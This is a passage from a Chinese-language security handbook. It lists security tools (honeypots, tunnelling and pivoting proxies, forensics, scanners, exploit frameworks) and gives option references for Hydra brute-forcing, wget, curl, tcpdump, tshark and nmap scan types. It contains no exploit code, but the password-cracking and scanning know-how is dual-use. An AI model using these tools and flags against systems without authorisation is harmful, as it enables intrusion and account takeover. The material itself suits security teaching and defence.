href='https://github.com/simsong/tcpflow'><span>TCPFlow</span></a></li></ul></li></ol></li></ol><h4 id='1014-安全开发-357'><span>10.14. 安全开发 357</span></h4><ul><li><p><a href='http://www.tcpdump.org/'><span>TCPDump</span></a></p></li><li><p><a href='https://www.wireshark.org/'><span>WireShark</span></a></p></li><li><p><a href='https://github.com/salesforce/Argus'><span>Argus</span></a></p></li><li><p><a href='https://github.com/seladb/PcapPlusPlus'><span>PcapPlusPlus</span></a></p></li><li><p><a href='https://github.com/jpr5/ngrep'><span>ngrep</span></a></p></li><li><p><a href='https://github.com/cisco/joy'><span>cisco joy</span></a><span> A package for capturing and analyzing network flow data and intraflow data, for network research, forensics, and security monitoring.</span></p></li><li><p><a href='https://github.com/nfstream/nfstream'><span>NFStream</span></a><span> a Flexible Network Data Analysis Framework</span></p></li><li><p><a href='https://github.com/odedshimon/BruteShark'><span>BruteShark</span></a><span> Network Analysis Tool</span></p><ol start='' ><li><h3 id='堡垒机'><span>堡垒机</span></h3><ul><li><a href='https://github.com/jumpserver/jumpserver'><span>jumpserver</span></a></li><li><a href='https://github.com/triaquae/CrazyEye'><span>CrazyEye</span></a></li><li><a href='https://github.com/liftoff/GateOne'><span>GateOne</span></a></li></ul></li><li><h3 id='蜜罐'><span>蜜罐</span></h3><ul><li><a href='https://github.com/DinoTools/dionaea'><span>Dionaea</span></a></li><li><a href='https://github.com/threatstream/mhn'><span>Modern Honey Network</span></a></li><li><a href='https://github.com/micheloosterhof/cowrie'><span>Cowrie</span></a><span> SSH/Telnet 蜜罐</span></li><li><a href='https://github.com/omererdem/honeything'><span>honeything</span></a><span> IoT 蜜罐</span></li><li><a href='http://conpot.org/'><span>ConPot</span></a><span> 工控设施蜜罐</span></li><li><a href='https://github.com/Plazmaz/MongoDB-HoneyProxy'><span>MongoDB HoneyProxy</span></a></li><li><a href='https://github.com/jordan-wright/elastichoney'><span>ElasticHoney</span></a></li><li><a href='https://github.com/secureworks/dcept'><span>DCEPT</span></a></li><li><a href='https://github.com/thinkst/canarytokens'><span>Canarytokens</span></a></li><li><a href='http://bruteforcelab.com/honeydrive'><span>Honeydrive</span></a></li><li><a href='https://github.com/dtag-dev-sec/tpotce/'><span>T-Pot</span></a><span> The All In One Honeypot Platform</span></li><li><a href='https://github.com/p1r06u3/opencanary_web'><span>opencanary</span></a></li><li><a href='https://github.com/hacklcx/HFish'><span>HFish</span></a></li><li><a href='https://github.com/desaster/kippo'><span>kippo</span></a><span> SSH Honeypot</span></li><li><a href='https://github.com/seccome/Ehoney'><span>Ehoney</span></a><span> 欺骗防御系统</span></li></ul></li><li><h3 id='vpn-install'><span>VPN Install</span></h3><ul><li><a href='https://github.com/viljoviitanen/setup-simple-pptp-vpn'><span>pptp</span></a></li><li><a href='https://github.com/hwdsl2/setup-ipsec-vpn'><span>ipsec</span></a></li><li><a href='https://github.com/Nyr/openvpn-install'><span>openvpn</span></a></li></ul></li><li><h3 id='隧道--代理'><span>隧道 / 代理</span></h3><ul><li><a href='https://github.com/inconshreveable/ngrok'><span>ngrok</span></a></li><li><a href='https://github.com/knownsec/rtcp'><span>rtcp</span></a></li><li><a href='https://github.com/SECFORCE/Tunna'><span>Tunna</span></a></li><li><a href='https://github.com/sensepost/reDuh'><span>reDuh</span></a><span> Create a TCP circuit through validly formed HTTP requests</span></li><li><a href='https://github.com/sensepost/reGeorg'><span>reGeorg</span></a><span> pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn</span></li><li><a href='https://github.com/L-codes/Neo-reGeorg'><span>Neo-reGeorg</span></a><span> Neo-reGeorg is a project that seeks to aggressively refactor reGeorg</span></li><li><a href='https://github.com/nccgroup/ABPTTS'><span>ABPTTS</span></a><span> TCP tunneling over HTTP/HTTPS for web application servers</span></li><li><a href='https://github.com/fatedier/frp'><span>frp</span></a><span> A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet</span></li><li><a href='https://github.com/ffay/lanproxy'><span>lanproxy</span></a><span> 内网穿透工具</span></li><li><a href='https://github.com/sysdream/ligolo'><span>ligolo</span></a><span> Reverse Tunneling made easy for pentesters</span></li><li><a href='https://github.com/idlefire/ew'><span>EarthWorm</span></a><span> 是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。</span></li><li><a href='https://github.com/SECFORCE/Tunna'><span>Tunna</span></a><span> is a set of tools which will wrap and tunnel any TCP communication over HTTP</span></li><li><a href='https://github.com/blackarrowsec/mssqlproxy'><span>mssqlproxy</span></a><span> is a toolkit aimed to perform lateral movement in restricted environments through a com- promised Microsoft SQL Server via socket reuse</span></li><li><a href='https://github.com/ehang-io/nps'><span>nps</span></a><span> a lightweight, high-performance, powerful intranet penetration proxy server, with a powerful web management terminal</span></li></ul></li><li><h3 id='代理链'><span>代理链</span></h3><ul><li><a href='https://github.com/NetchX/Netch'><span>Netch</span></a><span> Support Socks5, Shadowsocks, ShadowsocksR, V2Ray, Trojan proxies. UDP NAT FullCone</span></li><li><a href='https://github.com/haad/proxychains'><span>proxychains</span></a><span> a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy</span></li><li><a href='https://github.com/ginuerzh/gost'><span>gost</span></a><span> GO Simple Tunnel</span></li></ul></li></ol></li></ul><blockquote><p><strong><span>10.15. 运维</span></strong><span> </span><strong><span>359</span></strong></p></blockquote><ol start='6' ><li><h3 id='资产管理-2'><span>资产管理</span></h3><ul><li><a href='https://github.com/Tencent/bk-cmdb'><span>BlueKing CMDB</span></a><span> 面向资产及应用的企业级配置管理平台</span></li><li><a href='https://github.com/TophantTechnology/ARL'><span>ARL</span></a><span> 资产侦察灯塔系统</span></li></ul></li><li><h3 id='合规'><span>合规</span></h3><ul><li><a href='https://github.com/momosecurity/bombus'><span>bombus</span></a><span> 合规审计平台</span></li></ul></li><li><h3 id='风控'><span>风控</span></h3><ul><li><a href='https://github.com/threathunterX/nebula'><span>nebula</span></a></li><li><a href='https://github.com/ysrc/Liudao'><span>Liudao</span></a><span> </span>“<span>六道</span>”<span>实时业务风控系统</span></li><li><a href='https://github.com/momosecurity/aswan'><span>aswan</span></a><span> 陌陌风控系统静态规则引擎</span></li></ul></li><li><h3 id='siem-2'><span>SIEM</span></h3><ul><li><a href='https://github.com/apache/metron'><span>metron</span></a></li><li><a href='https://github.com/mozilla/MozDef'><span>MozDef</span></a></li></ul></li><li><h3 id='安全运维'><span>安全运维</span></h3><ul><li><a href='https://github.com/HandsomeOne/Scout'><span>Scout</span></a><span> URL 监控系统</span></li><li><a href='https://github.com/qunarcorp/open_dnsdb'><span>OpenDnsdb</span></a><span> 基于 Python 的 DNS 管理系统</span></li></ul></li><li><h3 id='系统监控'><span>系统监控</span></h3><ul><li><a href='https://github.com/netdata/netdata'><span>netdata</span></a><span> Real-time performance monitoring</span></li><li><a href='https://github.com/iovisor/bcc'><span>bcc</span></a><span> Tools for BPF-based Linux IO analysis, networking, monitoring, and more</span></li></ul></li><li><h3 id='windows-7'><span>Windows</span></h3><ul><li><a href='https://docs.microsoft.com/zh-cn/sysinternals'><span>Windows Sysinternals</span></a></li></ul></li><li><h3 id='网络测试'><span>网络测试</span></h3><ul><li><a href='https://github.com/Shopify/toxiproxy'><span>Toxiproxy</span></a><span> A TCP proxy to simulate network and system conditions for chaos and resiliency testing</span></li></ul></li><li><h3 id='红队模拟'><span>红队模拟</span></h3><ul><li><a href='https://github.com/mitre/caldera'><span>CALDERA</span></a><span> Scalable Automated Adversary Emulation Platform</span></li></ul></li><li><h3 id='网络模拟'><span>网络模拟</span></h3><ul><li><a href='https://github.com/seed-labs/seed-emulator'><span>Internet Emulator</span></a><span> A Python framework for creating emulation of the Internet</span></li></ul></li></ol><p>&nbsp;</p><ol start='' ><li><h2 id='取证'><span>取证</span></h2><ol start='' ><li><h3 id='内存取证'><span>内存取证</span></h3><ul><li><a href='http://edr.sangfor.com.cn/tool/SfabAntiBot_X64.7z'><span>SfAntiBotPro</span></a></li><li><a href='https://github.com/volatilityfoundation/volatility'><span>volatility</span></a></li><li><a href='https://github.com/google/rekall'><span>Rekall</span></a><span> Memory Forensic Framework</span></li><li><a href='https://github.com/504ensicsLabs/LiME'><span>LiME</span></a><span> LiME (formerly DMD) is a Loadable Kernel Module (LKM), which allows the acquisition of volatile memory from Linux and Linux-based devices, such as those powered by Android.</span></li><li><a href='https://github.com/microsoft/avml'><span>AVML</span></a><span> Acquire Volatile Memory for Linux</span></li></ul></li></ol></li><li><h2 id='其他-8'><span>其他</span></h2><ol start='' ><li><h3 id='综合框架-2'><span>综合框架</span></h3><ul><li><a href='https://www.metasploit.com/'><span>metasploit</span></a></li><li><a href='http://w3af.org/'><span>w3af</span></a></li><li><a href='https://github.com/NullArray/AutoSploit/'><span>AutoSploit</span></a></li><li><a href='https://cirt.net/nikto2'><span>Nikto</span></a></li><li><a href='https://my.oschina.net/u/995648/blog/114321'><span>skipfish</span></a></li><li><a href='http://www.arachni-scanner.com/'><span>Arachni</span></a></li><li><a href='http://www.freebuf.com/sectool/5427.html'><span>ZAP</span></a></li><li><a href='https://portswigger.net/burp/'><span>BrupSuite</span></a></li><li><a href='https://github.com/smicallef/spiderfoot'><span>Spiderfoot</span></a></li><li><a href='https://github.com/az0ne/AZScanner'><span>AZScanner</span></a></li><li><a href='https://github.com/jeffzh3ng/Fuxi-Scanner'><span>Fuxi</span></a></li></ul></li></ol></li></ol><h4 id='1016-取证-361'><span>10.16. 取证 361</span></h4><ul><li><a href='https://www.vegabird.com/vooki/'><span>vooki</span></a></li><li><a href='https://github.com/MrSqar-Ye/BadMod'><span>BadMod</span></a></li><li><a href='https://github.com/Manisso/fsociety'><span>fsociety</span></a><span> Hacking Tools Pack</span></li><li><a href='https://github.com/pry0cc/axiom'><span>axiom</span></a><span> A dynamic infrastructure toolkit for red teamers and bug bounty hunters</span></li></ul><ol start='2' ><li><h3 id='验证码'><span>验证码</span></h3><ul><li><a href='https://github.com/FSecureLABS/captcha22'><span>CAPTCHA22</span></a><span> is a toolset for building, and training, CAPTCHA cracking models using neural networks.</span></li></ul></li><li><h3 id='webassembly-2'><span>WebAssembly</span></h3><ul><li><a href='https://github.com/WebAssembly/wabt'><span>wabt</span></a></li><li><a href='https://github.com/WebAssembly/binaryen'><span>binaryen</span></a></li><li><a href='https://github.com/wwwg/wasmdec'><span>wasmdec</span></a></li></ul></li><li><h3 id='混淆-2'><span>混淆</span></h3><ul><li><a href='https://github.com/mindedsecurity/JStillery'><span>JStillery</span></a></li><li><a href='https://github.com/javascript-obfuscator/javascript-obfuscator'><span>javascript obfuscator</span></a></li><li><a href='https://github.com/CaledoniaProject/php-decoder'><span>基于 hook 的 php 混淆解密</span></a></li><li><a href='https://github.com/danielbohannon/Invoke-Obfuscation'><span>Invoke Obfuscation</span></a></li></ul></li><li><h3 id='proxy-pool'><span>Proxy Pool</span></h3><ul><li><a href='https://github.com/jhao104/proxy_pool'><span>proxy pool by jhao104</span></a></li><li><a href='https://github.com/Python3WebSpider/ProxyPool'><span>Proxy Pool by Germey</span></a></li><li><a href='https://github.com/imWildCat/scylla'><span>scylla</span></a></li></ul></li><li><h3 id='android'><span>Android</span></h3><ul><li><a href='https://github.com/WooyunDota/DroidSSLUnpinning'><span>DroidSSLUnpinning</span></a><span> Android certificate pinning disable tools</span></li></ul></li><li><h3 id='其他-其他'><span>其他 {#其他}</span></h3><ul><li><a href='https://github.com/ropnop/serverless_toolkit'><span>Serverless Toolkit</span></a></li><li><a href='https://github.com/PortSwigger/hackability'><span>Rendering Engine Probe</span></a></li><li><a href='http://www.httrack.com/'><span>httrack</span></a></li><li><a href='https://curl.haxx.se/'><span>curl</span></a></li><li><a href='https://github.com/trimstray/htrace.sh'><span>htrace</span></a></li><li><a href='https://docs.microsoft.com/en-us/sysinternals/downloads/'><span>Microsoft Sysinternals Utilities</span></a></li></ul></li></ol><p><span id="_bookmark108" class="anchor"></span><span>CHAPTER 11</span></p><p><span>手册速查</span></p><ol start='' ><li><h2 id='爆破工具'><span>爆破工具</span></h2><ol start='' ><li><h3 id='hydra'><span>Hydra</span></h3><ul><li><span>-R 继续从上一次进度破解</span></li><li><span>-S 使用 SSL 链接</span></li><li><span>-s</span><span>&lt;</span><span>PORT</span><span>&gt;</span><span> 指定端口</span></li><li><span>-l</span><span>&lt;</span><span>LOGIN</span><span>&gt;</span><span> 指定破解的用户</span></li><li><span>-L</span><span>&lt;</span><span>FILE</span><span>&gt;</span><span> 指定用户名字典</span></li><li><span>-p</span><span>&lt;</span><span>PASS</span><span>&gt;</span><span> 指定密码破解</span></li><li><span>-P</span><span>&lt;</span><span>FILE</span><span>&gt;</span><span> 指定密码字典</span></li><li><span>-e</span><span>&lt;</span><span>ns</span><span>&gt;</span><span> 可选选项，n：空密码试探，s：使用指定用户和密码试探</span></li><li><span>-C</span><span>&lt;</span><span>FILE</span><span>&gt;</span><span> 使用冒号分割格式，例如</span>“<span>user:pwd</span>”<span> 来代替-L/-P 参数</span></li><li><span>-M</span><span>&lt;</span><span>FILE</span><span>&gt;</span><span> 指定目标列表文件一行一条</span></li><li><span>-o</span><span>&lt;</span><span>FILE</span><span>&gt;</span><span> 指定结果输出文件</span></li><li><span>-f 在使用-M 参数以后，找到第一对登录名或者密码的时候中止破解</span></li><li><span>-t</span><span>&lt;</span><span>TASKS</span><span>&gt;</span><span> 同时运行的线程数，默认为 16</span></li><li><span>-w</span><span>&lt;</span><span>TIME</span><span>&gt;</span><span> 设置最大超时的时间，单位秒，默认是 30s</span></li><li><span>-vV 显示详细过程</span></li></ul></li></ol></li><li><h2 id='下载工具'><span>下载工具</span></h2><ol start='' ><li><h3 id='wget'><span>wget</span></h3></li></ol></li></ol><h4 id='常用-2'><span>常用</span></h4><ul><li><span>普通下载 wget </span><a href='http://example.com/file.iso' target='_blank' class='url'>http://example.com/file.iso</a></li><li><span>指定保存文件名 wget ‐‐output-document=myname.iso </span><a href='http://example.com/file.iso' target='_blank' class='url'>http://example.com/file.iso</a></li><li><span>保存到指定目录 wget ‐‐directory-prefix=folder/subfolder </span><a href='http://example.com/file.iso' target='_blank' class='url'>http://example.com/file.iso</a></li><li><span>大文件断点续传 wget ‐‐continue </span><a href='http://example.com/big.file.iso' target='_blank' class='url'>http://example.com/big.file.iso</a></li><li><span>下载指定文件中的 url 列表 wget ‐‐input list-of-file-urls.txt</span></li><li><span>下载指定数字列表的多个文件 wget </span><a href='http://example.com/images/'><span>http://example.com/images/{1..20}.jpg</span></a></li><li><span>下 载 web 页 面 的 所 有 资 源 wget ‐‐page-requisites ‐‐span-hosts ‐‐convert-links</span></li></ul><blockquote><p><span>‐‐adjust-extension </span><a href='http://example.com/dir/file' target='_blank' class='url'>http://example.com/dir/file</a></p></blockquote><h4 id='整站下载'><span>整站下载</span></h4><ul><li><span>下载所有链接的页面和文件 wget ‐‐execute robots=off ‐‐recursive ‐‐no-parent ‐‐continue</span></li></ul><blockquote><p><span>‐‐no-clobber </span><a href='http://example.com/' target='_blank' class='url'>http://example.com/</a></p></blockquote><ul><li><span>下载指定后缀的文件 wget ‐‐level=1 ‐‐recursive ‐‐no-parent ‐‐accept mp3,MP3 http:// example.com/mp3/</span></li><li><span>排除指定目录下载 wget ‐‐recursive ‐‐no-clobber ‐‐no-parent ‐‐exclude-directories / forums,/support </span><a href='http://example.com/'><span>http://example.com</span></a></li></ul><h4 id='指定参数'><span>指定参数</span></h4><ul><li><span>user agent ‐‐user-agent=</span><span>&quot;</span><span>Mozilla/5.0 Firefox/4.0.1</span><span>&quot;</span></li><li><span>basic auth ‐‐http-user=user ‐‐http-password=pwd</span></li><li><span>保存 cookie ‐‐cookies=on ‐‐save-cookies cookies.txt ‐‐keep-session-cookies</span></li><li><span>使用 cookie ‐‐cookies=on ‐‐load-cookies cookies.txt ‐‐keep-session-cookies</span></li></ul><h3 id='curl'><span>curl</span></h3><h4 id='常用-3'><span>常用</span></h4><ul><li><span>直接显示 curl </span><a href='http://www.example.com/'><span>www.example.com</span></a></li><li><span>保存指定的名字 -o newname</span></li><li><span>不指定名字 -O</span></li></ul><h4 id='正则'><span>正则</span></h4><ul><li><span>文件名 curl ftp://example.com/file</span><span>[</span><span>1-100</span><span>]</span><span>.txt</span></li><li><span>域名 curl </span><a href='http://site/'><span>http://site.{one,two,three}.com</span></a></li></ul><ol start='3' ><li><h2 id='流量相关'><span>流量相关</span></h2><ol start='' ><li><h3 id='tcpdump'><span>TCPDump</span></h3></li></ol></li></ol><blockquote><p><span>TCPDump 是一款数据包的抓取分析工具，可以将网络中传送的数据包的完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供逻辑语句来过滤包。</span></p></blockquote><h4 id='命令行常用选项-1'><span>命令行常用选项</span></h4><ul><li><p><span>-B </span><span>&lt;</span><span>buffer_size</span><span>&gt;</span><span> 抓取流量的缓冲区大小，若过小则可能丢包，单位为 KB</span></p></li><li><p><span>-c </span><span>&lt;</span><span>count</span><span>&gt;</span><span> 抓取 n 个包后退出</span></p></li><li><p><span>-C </span><span>&lt;</span><span>file_size</span><span>&gt;</span><span> 当前记录的包超过一定大小后，另起一个文件记录，单位为 MB</span></p></li><li><p><span>-i </span><span>&lt;</span><span>interface</span><span>&gt;</span><span> 指定抓取网卡经过的流量</span></p></li><li><p><span>-n 不转换地址</span></p></li><li><p><span>-r </span><span>&lt;</span><span>file</span><span>&gt;</span><span> 读取保存的 pcap 文件</span></p></li><li><p><span>-s </span><span>&lt;</span><span>snaplen</span><span>&gt;</span><span> 从每个报文中截取 snaplen 字节的数据，0 为所有数据</span></p></li><li><p><span>-q 输出简略的协议相关信息，输出行都比较简短。</span></p></li><li><p><span>-W </span><span>&lt;</span><span>cnt</span><span>&gt;</span><span> 写满 cnt 个文件后就不再写入</span></p></li><li><h4 id='-w-file-保存流量至文件'><span>-w </span><span>&lt;</span><span>file</span><span>&gt;</span><span> 保存流量至文件</span></h4><ul><li><span>按时间分包时，可使用 strftime 的格式命名，例如 %Y</span><span>_</span><span>%m</span><span>_</span><span>%d</span><span>_</span><span>%H</span><span>_</span><span>%M</span><span>_</span><span>%S.pcap</span></li></ul></li><li><p><span>-G </span><span>&lt;</span><span>seconds</span><span>&gt;</span><span> 按时间分包</span></p></li><li><p><span>-v 产生详细的输出，-vv -vvv 会产生更详细的输出</span></p></li><li><p><span>-X 输出报文头和包的内容</span></p></li><li><p><span>-Z </span><span>&lt;</span><span>user</span><span>&gt;</span><span> 在写文件之前，转换用户</span></p></li></ul><h3 id='bro'><span>Bro</span></h3><blockquote><p><span>Bro 是一个开源的网络流量分析工具，支持多种协议，可实时或者离线分析流量。</span></p></blockquote><h4 id='命令行'><span>命令行</span></h4><ul><li><span>实时监控 bro -i </span><span>&lt;</span><span>interface</span><span>&gt;</span><span> </span><span>&lt;</span><span>list of script to load</span><span>&gt;</span></li><li><span>分析本地流量 bro -r </span><span>&lt;</span><span>pcapfile</span><span>&gt;</span><span> </span><span>&lt;</span><span>scripts</span><span>.</span><span>..</span><span>&gt;</span></li><li><span>分割解析流量后的日志 bro-cut</span></li></ul><h4 id='脚本'><span>脚本</span></h4><blockquote><p><span>为了能够扩展和定制 Bro 的功能，Bro 提供了一个事件驱动的脚本语言。</span></p></blockquote><h3 id='tcpflow'><span>tcpflow</span></h3><blockquote><p><span>tcpflow 也是一个抓包工具，它的特点是以流为单位显示数据内容，在分析 HTTP 等协议的数据时候，用</span></p><p><span>tcpflow 会更便捷。</span></p></blockquote><h4 id='命令行常用选项-2'><span>命令行常用选项</span></h4><ul><li><span>-b max_bytes 定义最大抓取流量</span></li><li><span>-e name 指定解析的 scanner</span></li><li><span>-i interface 指定抓取接口</span></li><li><span>-o outputdir 指定输出文件夹</span></li><li><span>-r file 读取文件</span></li><li><span>-R file 读取文件，但是只读取完整的文件</span></li></ul><h3 id='tshark'><span>tshark</span></h3><blockquote><p><span>WireShark 的命令行工具，可以通过命令提取自己想要的数据，可以重定向到文件，也可以结合上层语言来调用命令行，实现对数据的处理。</span></p></blockquote><h4 id='输入接口'><span>输入接口</span></h4><ul><li><span>-i </span><span>&lt;</span><span>interface</span><span>&gt;</span><span> 指定捕获接口，默认是第一个非本地循环接口</span></li><li><span>-f </span><span>&lt;</span><span>capture filter</span><span>&gt;</span><span> 设置抓包过滤表达式，遵循 libpcap 过滤语法，这个选项在抓包的过程中过滤，如果是分析本地文件则用不到</span></li><li><span>-s </span><span>&lt;</span><span>snaplen</span><span>&gt;</span><span> 设置快照长度，用来读取完整的数据包，因为网络中传输有 65535 的限制，值 0 代表快照长度 65535，默认为 65535</span></li><li><span>-p 以非混合模式工作，即只关心和本机有关的流量</span></li><li><span>-B </span><span>&lt;</span><span>buffer size</span><span>&gt;</span><span> 设置缓冲区的大小，只对 windows 生效，默认是 2M</span></li><li><span>-y </span><span>&lt;</span><span>link type</span><span>&gt;</span><span> 设置抓包的数据链路层协议，不设置则默认为 -L 找到的第一个协议</span></li><li><span>-D 打印接口的列表并退出</span></li><li><span>-L 列出本机支持的数据链路层协议，供-y 参数使用。</span></li><li><span>-r </span><span>&lt;</span><span>infile</span><span>&gt;</span><span> 设置读取本地文件</span></li></ul><h4 id='捕获停止选项'><span>捕获停止选项</span></h4><ul><li><p><span>-c </span><span>&lt;</span><span>packet count</span><span>&gt;</span><span> 捕获 n 个包之后结束，默认捕获无限个</span></p></li><li><h4 id='-a-autostop-cond'><span>-a </span><span>&lt;</span><span>autostop cond</span><span>&gt;</span></h4><ul><li><span>duration:NUM 在 num 秒之后停止捕获</span></li><li><span>filesize:NUM 在 numKB 之后停止捕获</span></li><li><span>files:NUM 在捕获 num 个文件之后停止捕获</span></li></ul></li></ul><h4 id='处理选项'><span>处理选项</span></h4><ul><li><span>-Y </span><span>&lt;</span><span>display filter</span><span>&gt;</span><span> 使用读取过滤器的语法，在单次分析中可以代替 -R 选项</span></li><li><span>-n 禁止所有地址名字解析（默认为允许所有）</span></li><li><span>-N 启用某一层的地址名字解析。m 代表 MAC 层，n 代表网络层，t 代表传输层，C 代表当前异步 DNS查找。如果 -n 和 -N 参数同时存在，-n 将被忽略。如果 -n 和 -N 参数都不写，则默认打开所有地址名字解析。</span></li><li><span>-d 将指定的数据按有关协议解包输出，如要将 tcp 8888 端口的流量按 http 解包，应该写为 -d tcp. port==8888,http 。可用 tshark -d 列出所有支持的有效选择器。</span></li></ul><h4 id='输出选项'><span>输出选项</span></h4><ul><li><span>-w </span><span>&lt;</span><span>outfile</span><span>&gt;</span><span> 设置 raw 数据的输出文件。不设置时为 stdout</span></li><li><span>-F </span><span>&lt;</span><span>output file type</span><span>&gt;</span><span> 设置输出的文件格式，默认是 .pcapng，使用 tshark -F 可列出所有支持的输出文件类型</span></li><li><span>-V 增加细节输出</span></li><li><span>-O </span><span>&lt;</span><span>protocols</span><span>&gt;</span><span> 只显示此选项指定的协议的详细信息</span></li><li><span>-P 即使将解码结果写入文件中，也打印包的概要信息</span></li><li><span>-S </span><span>&lt;</span><span>separator</span><span>&gt;</span><span> 行分割符</span></li><li><span>-x 设置在解码输出结果中，每个 packet 后面以 HEX dump 的方式显示具体数据</span></li><li><span>-T pdml</span><span>|</span><span>ps</span><span>|</span><span>text</span><span>|</span><span>fields</span><span>|</span><span>psml 设置解码结果输出的格式，默认为 text</span></li><li><span>-e 如果 -T 选项指定，-e 用来指定输出哪些字段</span></li><li><span>-t a</span><span>|</span><span>ad</span><span>|</span><span>d</span><span>|</span><span>dd</span><span>|</span><span>e</span><span>|</span><span>r</span><span>|</span><span>u</span><span>|</span><span>ud 设置解码结果的时间格式</span></li><li><span>-u s</span><span>|</span><span>hms 格式化输出秒</span></li><li><span>-l 在输出每个包之后 flush 标准输出</span></li><li><span>-q 结合 -z 选项进行使用，来进行统计分析</span></li><li><span>-X </span><span>&lt;</span><span>key</span><span>&gt;</span><span>:</span><span>&lt;</span><span>value</span><span>&gt;</span><span> 扩展项，lua_script、read_format</span></li><li><span>-z 统计选项，具体的参考文档</span></li></ul><h4 id='其他选项'><span>其他选项</span></h4><ul><li><span>-h 显示命令行帮助</span></li><li><span>-v 显示 tshark 的版本信息</span></li></ul><ol start='4' ><li><h2 id='嗅探工具'><span>嗅探工具</span></h2><ol start='' ><li><h3 id='nmap'><span>Nmap</span></h3></li></ol></li></ol><blockquote><p><span>nmap </span><span>[</span><span>&lt;</span><span> 扫描类型 </span><span>&gt;</span><span>.</span><span>..</span><span>]</span><span> </span><span>[</span><span>&lt;</span><span> 选项 </span><span>&gt;</span><span>]</span><span> {</span><span>&lt;</span><span> 扫描目标说明 </span><span>&gt;</span><span>}</span></p></blockquote><h4 id='指定目标'><span>指定目标</span></h4><ul><li><span>CIDR 风格 192.168.1.0/24</span></li><li><span>逗号分割 </span><a href='http://www.zhihu.com/'><span>www.baidu.com,www.zhihu.com</span></a></li><li><span>分割线 10.22-25.43.32</span></li><li><span>来自文件 -iL </span><span>&lt;</span><span>inputfile</span><span>&gt;</span></li><li><span>排 除 不 需 要 的 host </span><span>-</span><span>-exclude </span><span>&lt;</span><span>host1 </span><span>[</span><span>, host2</span><span>]</span><span> </span><span>[</span><span>, host3</span><span>]</span><span> </span><span>.</span><span>.. </span><span>&gt;</span><span> </span><span>-</span><span>-excludefile</span></li></ul><blockquote><p><span>&lt;</span><span>excludefile</span><span>&gt;</span></p></blockquote><h4 id='主机发现'><span>主机发现</span></h4><ul><li><span>-sL List Scan - simply list targets to scan</span></li><li><span>-sn/-sP Ping Scan - disable port scan</span></li><li><span>-Pn Treat all hosts as online </span>–<span> skip host discovery</span></li><li><span>-sS/sT/sA/sW/sM TCP SYN/Connect()/ACK/Window/Maimon scans</span></li><li><span>-sU UDP Scan</span></li><li><span>-sN/sF/sX TCP Null, FIN, and Xmas scans</span></li></ul><blockquote><p><span>表 1: 扫描方式表</span></p></blockquote><p><span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| 名称       |      | 包标记     | 端口      | OPEN       | 端口     | CLOSE      | 特点                     |</span>
<span>+</span><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>+</span></mark><mark><span>==+</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><span>+</span><mark><span>=</span></mark><mark><span>=</span></mark><span>=+</span><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>+</span></mark><mark><span>=</span></mark><mark><span>=+</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><span>+</span><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><mark><span>=</span></mark><span>=+</span>
<span>| TCP        | SYN  | SYN        | 回复      | ACK+SYN    | 回复     | RST        | 应用程序无日志，         |</span>
<span>|            |      |            |           |            |          |            |                          |</span>
<span>| scan       |      |            |           |            |          |            | 但是容易被发现           |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| 全连接扫描 |      | SYN        | 回复      | ACK+SYN    | 回复     | RST        | 容易被发现               |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| ACK 扫描   |      | ACK        | 回复      | RST        | 包被丢弃 |            | .                        |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| FIN 扫描   |      | FIN        | 包被丢弃  |            | 回复     | RST        | 需要等待超时，效         |</span>
<span>|            |      |            |           |            |          |            |                          |</span>
<span>|            |      |            |           |            |          |            | 率低                     |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| TCP        | Xmas | FIN+URG+PS | H包被丢弃 |            | 回复     | RST        | 需要等待超时，效         |</span>
<span>|            |      |            |           |            |          |            |                          |</span>
<span>| 扫描       |      |            |           |            |          |            | 率低；不适用所有操作系统 |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span>
<span>| TCP        | NULL | NULL       | 包被丢弃  |            | 回复     | RST        | 需要等待超时，效         |</span>
<span>|            |      |            |           |            |          |            |                          |</span>
<span>| 扫描       |      |            |           |            |          |            | 率低；不适用所有操作系统 |</span>
<span>+</span>––––––<span>+</span>–––<span>+</span>––––––<span>+</span>––––—<span>+</span>––––––<span>+</span>–––––<span>+</span>––––––<span>+</span>–––––––––––––<span>+</span></p><h4 id='端口扫描-2'><span>端口扫描</span></h4><ul><li><span>-</span><span>-scanflags 定制的 TCP 扫描</span></li><li><span>-P0 无 ping</span></li><li><span>PS </span><span>[</span><span>port list</span><span>]</span><span> (TCP SYN ping) // need root on Unix</span></li><li><span>PA </span><span>[</span><span>port list</span><span>]</span><span> (TCP ACK ping)</span></li><li><span>PU </span><span>[</span><span>port list</span><span>]</span><span> (UDP ping)</span></li><li><span>PR (Arp ping)</span></li><li><span>p </span><span>&lt;</span><span>port message</span><span>&gt;</span></li><li><span>F 快速扫描</span></li><li><span>r 不使用随机顺序扫描</span></li></ul><h4 id='服务和版本探测'><span>服务和版本探测</span></h4><ul><li><span>-sV 版本探测</span></li><li><span>-</span><span>-allports 